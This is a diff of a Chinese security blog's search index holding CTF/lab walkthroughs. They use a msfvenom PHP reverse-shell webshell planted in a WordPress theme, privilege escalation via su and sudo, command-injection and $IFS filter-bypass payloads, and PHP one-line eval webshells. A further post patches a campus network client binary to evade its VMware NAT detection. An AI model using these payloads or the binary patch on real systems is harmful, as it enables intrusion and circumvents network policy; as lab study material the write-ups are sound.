+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机ip lport=4444 raw</span><br><span class="line"><span class="comment"># 将生成的webshell复制到一个php文件中</span></span><br><span class="line">gedit webshell.php</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi//handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp <span class="comment"># 监听</span></span><br><span class="line"><span class="built_in">set</span> lhost 攻击机ip</span><br><span class="line">show options <span class="comment"># 查看参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p>然后就是上传webshell，并且执行（访问具有webshell的php页面）</p>
+<p>我们将webshell上传到editor的404.php页面</p>
+<p>然后打开404页面</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">http://靶场IP/wordpress/wp-content/themes/twentyfourteen/404.php</span><br></pre></td></tr></table></figure></div>
+
+<p>然后返回攻击机，发现成功监听，查看当前用户，执行以下命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+
+<p>发现获得服务器的通用权限</p>
+<p>优化终端</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>查看当前计算机的用户</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
+
+<p>查看敏感用户，发现一个togie</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su togie</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入密码为12345，前面获取的密码</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="4-提升权限"><a href="#4-提升权限" class="headerlink" title="4. 提升权限"></a>4. 提升权限</h3><p>查找共享目录下的敏感文件</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SMB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctf 基本思路</title>
+    <url>/2024/09/11/93f6ba8bb1f2/</url>
+    <content><![CDATA[<h1 id="得到flag参考思路"><a href="#得到flag参考思路" class="headerlink" title="得到flag参考思路"></a>得到flag参考思路</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><h3 id="1-1-扫描信息"><a href="#1-1-扫描信息" class="headerlink" title="1.1 扫描信息"></a>1.1 扫描信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="1-2-探测敏感信息"><a href="#1-2-探测敏感信息" class="headerlink" title="1.2 探测敏感信息"></a>1.2 探测敏感信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://ip:port</span><br><span class="line"></span><br><span class="line">dirb http://ip:port <span class="comment"># 探测相关目录</span></span><br><span class="line"><span class="comment">#两种方法的port不可省略，80可省略</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><h3 id="1-1-http服务"><a href="#1-1-http服务" class="headerlink" title="1.1 http服务"></a>1.1 http服务</h3><p><strong>对于大端口非htp服务，可以使用nc来探测该端口的banner信息</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc IP port</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>对于大端口http服务，可以使用浏览器浏览界面查看源代码，寻找flag值</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip地址:端口号</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>在扫描的全部信息里寻找是否为http服务</p>
+</blockquote>
+<p><strong>对于http服务，打开相关敏感页面，查看敏感信息，找到可利用的位置（包括80端口）</strong></p>
+<p><strong>&#x3D;&#x3D;注意之前用dirb和nikto扫描出来的目录&#x3D;&#x3D;</strong></p>
+<p>注意到flag.txt，打开获得flag</p>
+<p>并且这里有个passwords.html，打开发现没有什么，但是我们&#x3D;&#x3D;查看源代码&#x3D;&#x3D;，<strong>发现一个password：Winter</strong>，记录下来</p>
+<h3 id="1-2-FTP服务"><a href="#1-2-FTP服务" class="headerlink" title="1.2 FTP服务"></a>1.2 FTP服务</h3><p><strong>FTP 匿名登陆 挖掘敏感信息</strong></p>
+<p>在浏览器输入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://IP</span><br></pre></td></tr></table></figure></div>
+
+<p> 匿名登录ftp服务器根目录</p>
+<p>发现flag</p>
+<p><strong>然后在站点robots.txt文件中寻找敏感文件目录，挖掘漏洞（在扫描的信息中查看）</strong></p>
+<p>&#x3D;&#x3D;注意：对于命令执行，为了绕过对应的限制，可以使用相近命令&#x3D;&#x3D;</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat -&gt; more</span><br></pre></td></tr></table></figure></div>
+
+<p>然后依次打开robots.txt中的目录</p>
+<p>发现命令执行窗口</p>
+<p>于是想到命令注入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;id</span><br><span class="line"></span><br><span class="line">127.0.0.1;more /etc/passwd # cat不能用</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。<br>2、;直接分号分隔<br>管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假<br>3、| 按位或<br>作用是直接执行|后面的语句<br>4、|| 逻辑或<br>作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>5、&amp; 按位与<br>&amp;前面和后面命令都要执行，无论前面真假<br>6、&amp;&amp; 逻辑与<br>如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行</p>
+</blockquote>
+<p>找到在home下的用户Summer</p>
+<p>然后利用ssh远程连接</p>
+<p>但是发现无法直接连接，看到扫描的端口号有个22222端口</p>
+<p>于是利用这个端口进行连接</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p 22222 Summer@IP</span><br><span class="line"><span class="comment">#输入密码 Winter</span></span><br></pre></td></tr></table></figure></div>
+
+<p>于是得到反弹shell</p>
+<p>利用pwd ls cat more等命令</p>
+<p>查看flag</p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>空格绕过：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1 改 成 1改成1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>common</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -943,22 +943,6 @@
       </tags>
   </entry>
   <entry>
-    <title>文件上传</title>
-    <url>/2024/09/11/776247657efa/</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>人工智能简介</title>
     <url>/2024/09/21/efcce1b0a0d3/</url>
     <content><![CDATA[<h1 id="人工智能简介"><a href="#人工智能简介" class="headerlink" title="人工智能简介"></a>人工智能简介</h1><p>​		在21世纪的科技浪潮中，人工智能（AI）已成为推动社会进步的强大引擎。从智能手机的智能助手到医疗诊断的精准算法，再到自动驾驶汽车的复杂决策系统，人工智能正以前所未有的速度渗透到我们生活的方方面面。它不仅仅是冷冰冰的代码和算法，更是人类智慧的延伸，它学习、适应并模仿我们的行为，以提高效率、优化决策并增强我们的体验。</p>
@@ -1112,61 +1096,19 @@
       </tags>
   </entry>
   <entry>
-    <title>解决JNU某捷有线校园网关闭虚拟机网络服务</title>
-    <url>/2024/09/21/7d3ba1c32839/</url>
-    <content><![CDATA[<p><em><strong>免责声明：本文只作JNU锐捷校园网认证的经验分享，其他学校的校园网是否适用请自行尝试，所有后果与作者无关！</strong></em></p>
-<p><strong>注意：此方法只适用于虚拟机网络使用NAT连接。</strong></p>
-<p>首先我们先要知道为什么校园网会自动关闭虚拟机的NAT网络，说白了就是扫你服务是否开启，如果你的NAT服务开启，他就给你关闭。所以我们解决这个问题就要找到他的扫描在哪里。</p>
-<p>首先先按照以下方法来操作，你最后就会知道原理。先卸载你之前的校园网，并且把文件夹里的文件删除干净。</p>
-<p>首先需要做好准备，下载一个可以查看字节的软件，比如010editor、PEview、UltraEdit等。这里我们采用UltraEdit。相关软件请自行搜索下载。</p>
-<p>然后下载校园网认证的<a href="">安装包</a>进行安装。选择安装路径。然后点击立即安装。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211845185.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854110.png"
-                      alt="image-20240921185459092"
-                ></p>
-<h4 id="注意：这里安装完成后不要点击完成安装！！！！"><a href="#注意：这里安装完成后不要点击完成安装！！！！" class="headerlink" title="注意：这里安装完成后不要点击完成安装！！！！"></a>注意：这里安装完成后不要点击完成安装！！！！</h4><p>然后我们打开校园网安装路径的根目录，找到8021x.exe，这个exe文件其实就是扫描你的服务的，当你认证了校园网后，这个服务也会在后台运行，并且这个程序是关不了的，关了你的校园网也没了，所以很ex。。并且当你完成安装后，这个exe文件也就绑定了，无法更改（更改后会自动还原）。但是你没有点完成安装，这个文件就是可修改的。这就是原理。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854775.png"
-                      alt="image-20240921185425761"
-                ></p>
-<p>然后我们打开UltraEdit，把这个文件拖入到UltraEdit。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211856159.png"
-                      alt="image-20240921185659129"
-                ></p>
-<p>然后按住键盘的ctrl+f，进行搜索：<code>VMware NAT Service</code>，然后这里把这个字节改了就行，随便改，这里我把<code>VMware</code>改成了<code>VWware</code>。然后更改完成后按ctrl+s进行保存，这里就完成了，关闭UltraEdit。然后点击完成安装.</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211910081.png"
-                      alt="image-20240921191031242"
-                ></p>
-<p>这里就完成了，登陆校园网后，按住ctrl+shift+esc，打开任务管理器，点开服务，搜索NAT，然后右键启动VMware NAT Service，就会发现，这个服务不会被自动关闭了，虚拟机就可以正常上网了。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211911440.png"
-                      alt="image-20240921191124399"
-                ></p>
+    <title>文件上传</title>
+    <url>/2024/09/11/776247657efa/</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
 ]]></content>
       <categories>
-        <category>common</category>
+        <category>CTF</category>
+        <category>Web</category>
       </categories>
       <tags>
-        <tag>common</tag>
-        <tag>校园网</tag>
+        <tag>CTF</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -1227,6 +1169,64 @@
       <tags>
         <tag>CTF</tag>
         <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解决JNU某捷有线校园网关闭虚拟机网络服务</title>
+    <url>/2024/09/21/7d3ba1c32839/</url>
+    <content><![CDATA[<p><em><strong>免责声明：本文只作JNU锐捷校园网认证的经验分享，其他学校的校园网是否适用请自行尝试，所有后果与作者无关！</strong></em></p>
+<p><strong>注意：此方法只适用于虚拟机网络使用NAT连接。</strong></p>
+<p>首先我们先要知道为什么校园网会自动关闭虚拟机的NAT网络，说白了就是扫你服务是否开启，如果你的NAT服务开启，他就给你关闭。所以我们解决这个问题就要找到他的扫描在哪里。</p>
+<p>首先先按照以下方法来操作，你最后就会知道原理。先卸载你之前的校园网，并且把文件夹里的文件删除干净。</p>
+<p>首先需要做好准备，下载一个可以查看字节的软件，比如010editor、PEview、UltraEdit等。这里我们采用UltraEdit。相关软件请自行搜索下载。</p>
+<p>然后下载校园网认证的<a href="">安装包</a>进行安装。选择安装路径。然后点击立即安装。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211845185.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854110.png"
+                      alt="image-20240921185459092"
+                ></p>
+<h4 id="注意：这里安装完成后不要点击完成安装！！！！"><a href="#注意：这里安装完成后不要点击完成安装！！！！" class="headerlink" title="注意：这里安装完成后不要点击完成安装！！！！"></a>注意：这里安装完成后不要点击完成安装！！！！</h4><p>然后我们打开校园网安装路径的根目录，找到8021x.exe，这个exe文件其实就是扫描你的服务的，当你认证了校园网后，这个服务也会在后台运行，并且这个程序是关不了的，关了你的校园网也没了，所以很ex。。并且当你完成安装后，这个exe文件也就绑定了，无法更改（更改后会自动还原）。但是你没有点完成安装，这个文件就是可修改的。这就是原理。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854775.png"
+                      alt="image-20240921185425761"
+                ></p>
+<p>然后我们打开UltraEdit，把这个文件拖入到UltraEdit。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211856159.png"
+                      alt="image-20240921185659129"
+                ></p>
+<p>然后按住键盘的ctrl+f，进行搜索：<code>VMware NAT Service</code>，然后这里把这个字节改了就行，随便改，这里我把<code>VMware</code>改成了<code>VWware</code>。然后更改完成后按ctrl+s进行保存，这里就完成了，关闭UltraEdit。然后点击完成安装.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211910081.png"
+                      alt="image-20240921191031242"
+                ></p>
+<p>这里就完成了，登陆校园网后，按住ctrl+shift+esc，打开任务管理器，点开服务，搜索NAT，然后右键启动VMware NAT Service，就会发现，这个服务不会被自动关闭了，虚拟机就可以正常上网了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211911440.png"
+                      alt="image-20240921191124399"
+                ></p>
+]]></content>
+      <categories>
+        <category>common</category>
+      </categories>
+      <tags>
+        <tag>common</tag>
+        <tag>校园网</tag>
       </tags>
   </entry>
 </search>
